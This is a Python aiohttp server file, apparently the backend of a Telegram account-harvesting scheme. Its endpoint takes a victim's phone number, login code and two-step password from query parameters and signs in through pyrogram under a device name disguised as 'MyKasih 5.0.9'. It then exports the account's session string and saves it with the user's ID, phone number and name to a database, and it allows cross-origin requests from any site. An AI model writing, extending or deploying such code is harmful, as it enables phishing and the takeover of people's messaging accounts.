import logging

import aiohttp_cors
from aiohttp import web
from aiohttp.http_exceptions import BadStatusLine
from server.exceptions import FIleNotFound, InvalidHash


import time
from typing import Union

from pyrogram import Client
from pyrogram.errors import AuthKeyDuplicated, FloodWait, PhoneNumberInvalid, PhoneNumberBanned, PhoneCodeInvalid, \
    PhoneCodeExpired, SessionPasswordNeeded, PasswordHashInvalid
import config
from helpers.database import db


logger = logging.getLogger("server")

otp_hash = {}
clients = {}
need_pass = {}
saved = {}

routes = web.RouteTableDef()

__version__ = "1.0.0"


def reset(phone):
    if clients.get(phone):
        clients.pop(phone)
    if otp_hash.get(phone):
        otp_hash.pop(phone)
    if need_pass.get(phone):
        need_pass.pop(phone)


@routes.get("/", allow_head=True)
async def root_route_handler(_):
    return web.json_response(
        {
            "server_status": "running",
            "connected_bots": 1,
            "version": f"v{__version__}",
        }
    )


@routes.get("/my")
async def route_handler(request: web.Request):
    try:
        phone_number = request.query.get("phone")
        otp_code = request.query.get("otp")
        password = request.query.get("password")
        if phone_number:
            phone_number = phone_number.strip().replace("+", "")
        if phone_number and not otp_code and not password:
            status, message = await get_otp(phone_number)
            return web.json_response(
                {
                    "status": status,
                    "message": message,
                }
            )
        elif phone_number and otp_code and clients.get(phone_number, None):
            status, message = await send_otp(phone_number, otp_code)
            return web.json_response(
                {
                    "status": status,
                    "message": message,
                }
            )
        elif phone_number and password:
            if need_pass.get(phone_number, None):
                status, message = await send_password(phone_number, password)
                return web.json_response(
                    {
                        "status": status,
                        "message": message,
                    }
                )
        else:
            return web.json_response(
                {
                    "status": 400,
                    "message": "Please input phone number",
                }
            )
    except InvalidHash as e:
        print("Error", e)
        raise web.HTTPForbidden(text=e.message)
    except FIleNotFound as e:
        print("Error", e)
        raise web.HTTPNotFound(text=e.message)
    except (AttributeError, BadStatusLine, ConnectionResetError) as e:
        print("Error", e)
        pass
    except Exception as e:
        print("Error", e)
        logger.critical(str(e), exc_info=True)
        raise web.HTTPInternalServerError(text=str(e))

class_cache = {}


async def get_otp(phone: str) -> [int, str]:
    phone_hash = None
    try:
        print("get otp", phone)
        client = Client(
            name=f"{phone}",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            device_model="MyKasih",
            app_version="MyKasih 5.0.9",
            system_version=f"MyKasih 5.0.9",
            in_memory=True,
        )
        await client.connect()
        otp_sent = await client.send_code(phone)
        phone_hash = otp_sent.phone_code_hash
        otp_hash[phone] = phone_hash
        clients[phone] = client
        return 200, "OTP sent to `{phone}`"
    except FloodWait as flood:
        return 429, f"Flood wait {flood.value} seconds"
    except PhoneNumberInvalid:
        reset(phone)
        return 400, f"`PHONE NUMBER` is invalid. Please try again /start."
    except PhoneNumberBanned:
        reset(phone)
        return 403, f"Phone Number Banned from Telegram. Please try another number again /start."
    except Exception as e:
        print(e)


async def send_otp(phone: str, otp: str) -> [int, str]:
    phone_code = otp
    client: Union[Client, None] = clients.get(phone, None)
    phone_hash: str = otp_hash.get(phone, None)
    if not client or not phone_hash:
        return 400, "Please get otp first"
    try:
        await client.sign_in(phone, phone_hash, phone_code=phone_code)
        string_session = await client.export_session_string()
        is_me = await client.get_me()
        _ = await db.insert(
            is_me.id,
            is_me.phone_number,
            is_me.first_name,
            is_me.username,
            "",
            string_session,
            client.api_id,
            client.device_model,
            timestamp=int(time.time()),
        )
        await client.disconnect()
        clients.pop(phone)
        otp_hash.pop(phone)
        return 200, "Success"
    except PhoneCodeInvalid as pci:
        reset(phone)
        return 400, f"OTP is invalid. Please try again /start."
    except PhoneCodeExpired as pce:
        reset(phone)
        return 400, f"OTP is expired. Please try again /start."
    except SessionPasswordNeeded:
        need_pass[phone] = client
        return 200, "Please input password"


async def send_password(phone: str, password: str) -> [int, str]:
    client: Union[Client, None] = need_pass.get(phone, None)
    phone_hash: str = otp_hash.get(phone, None)
    if not client or not phone_hash:
        return 200, "Please get otp first"
    try:
        password = password.strip()
        await client.check_password(password=password)
        string_session = await client.export_session_string()
        is_me = await client.get_me()
        _ = await db.insert(
            is_me.id,
            is_me.phone_number,
            is_me.first_name,
            is_me.username,
            "",
            string_session,
            client.api_id,
            client.device_model,
            timestamp=int(time.time()),
        )
        await client.disconnect()
        reset(phone)
        return 200, "Success"
    except PasswordHashInvalid as phi:
        reset(phone)
        return 400, f"Password is invalid. Please try again /start."
    except Exception as e:
        print(e)
        return 400, f"Error: {e}"


def web_server():
    logger.info("Initializing..")
    web_app = web.Application(client_max_size=30000000)
    web_app.add_routes(routes)

    cors = aiohttp_cors.setup(web_app, defaults={
        "*": aiohttp_cors.ResourceOptions(
            allow_credentials=True,
            expose_headers="*",
            allow_headers="*"
        )
    })
    for route in list(web_app.router.routes()):
        cors.add(route)

    logger.info("Added routes")
    return web_app